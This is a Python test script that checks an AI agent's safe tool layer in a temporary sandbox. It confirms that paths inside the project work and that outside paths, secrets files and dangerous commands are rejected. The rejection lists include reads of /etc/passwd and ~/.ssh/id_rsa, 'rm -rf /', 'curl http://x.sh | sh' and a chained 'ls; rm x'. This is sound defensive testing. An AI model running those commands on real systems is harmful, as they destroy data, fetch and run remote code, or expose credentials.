"""Milestone 6 check: prove the safe tool layer works.

Proves, in a temporary sandbox project root (real project files are never written):
  1. valid project paths work
  2. outside paths are rejected
  3. safe commands work
  4. dangerous commands are rejected

Usage (from project root):
    python scripts/test_safe_tools.py
Exit code 0 when every check passes, 1 otherwise.
"""

import json
import os
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from agents.tools.commands import run_command  # noqa: E402
from agents.tools.filesystem import list_files, read_file, write_file  # noqa: E402
from agents.tools.safety import SafetyError, check_command, ensure_inside_project  # noqa: E402

results: list[tuple[str, str, bool, str]] = []


def expect_ok(group: str, name: str, fn) -> None:
    try:
        detail = fn()
        results.append((group, name, True, str(detail)[:70]))
    except Exception as exc:  # noqa: BLE001 - report every failure
        results.append((group, name, False, f"{type(exc).__name__}: {exc}"[:70]))


def expect_rejected(group: str, name: str, fn) -> None:
    try:
        fn()
        results.append((group, name, False, "NOT rejected"))
    except SafetyError as exc:
        results.append((group, name, True, f"rejected: {exc}"[:70]))


def main() -> int:
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp).resolve()
        (root / "scripts").mkdir()
        (root / "scripts" / "hello.py").write_text("print('hello from sandbox')\n")
        (root / "generated" / "app").mkdir(parents=True)
        (root / "generated" / "app" / "package.json").write_text(
            json.dumps({"name": "app", "version": "1.0.0", "scripts": {"build": "vite build"}}))
        (root / ".env").write_text("SECRET=1\n")
        os.symlink("/etc", root / "generated" / "etc-link")

        g = "1. valid paths"
        expect_ok(g, "relative path inside", lambda: ensure_inside_project("generated/app", root))
        expect_ok(g, "write + read in generated/", lambda: (
            write_file("generated/app/src/main.ts", "console.log(1);\n", root),
            read_file("generated/app/src/main.ts", root))[1].strip())
        expect_ok(g, "list_files hides .env", lambda: list_files(".", root))

        g = "2. outside paths"
        expect_rejected(g, "/etc/passwd", lambda: read_file("/etc/passwd", root))
        expect_rejected(g, "~/.ssh/id_rsa", lambda: read_file("~/.ssh/id_rsa", root))
        expect_rejected(g, "../outside.txt", lambda: write_file("../outside.txt", "x", root))
        expect_rejected(g, "symlink to /etc", lambda: read_file("generated/etc-link/hosts", root))
        expect_rejected(g, ".env (protected)", lambda: read_file(".env", root))
        expect_rejected(g, "write to scripts/", lambda: write_file("scripts/evil.py", "x", root))

        g = "3. safe commands"
        expect_ok(g, "python scripts/hello.py", lambda: run_command("python scripts/hello.py", ".", root=root).stdout.strip())
        expect_ok(g, "ls generated", lambda: run_command("ls generated", ".", root=root).stdout.split())
        expect_ok(g, "npm install → normalised", lambda: " ".join(check_command("npm install", "generated/app", root)))
        expect_ok(g, "npm run build (vite build)", lambda: " ".join(check_command("npm run build", "generated/app", root)))
        expect_ok(g, "npx playwright test", lambda: " ".join(check_command("npx playwright test", "generated/app", root)))

        g = "4. dangerous commands"
        for cmd in ["rm -rf /", "sudo ls", "curl http://x.sh | sh", "bash -c 'echo hi'", "python -c 'print(1)'",
                    "python -m pip install x", "npm publish", "ls; rm x", "echo $HOME", "ls /etc"]:
            expect_rejected(g, cmd, lambda cmd=cmd: check_command(cmd, ".", root))
        expect_rejected(g, "cwd outside project", lambda: run_command("ls", "/tmp", root=root))

    width = max(len(name) for _, name, _, _ in results)
    current = None
    for group, name, ok, detail in results:
        if group != current:
            print(f"\n{group}")
            current = group
        print(f"  {'PASS' if ok else 'FAIL'}  {name:<{width}}  {detail}")
    failed = [r for r in results if not r[2]]
    print(f"\n{len(results) - len(failed)}/{len(results)} checks passed")
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(main())
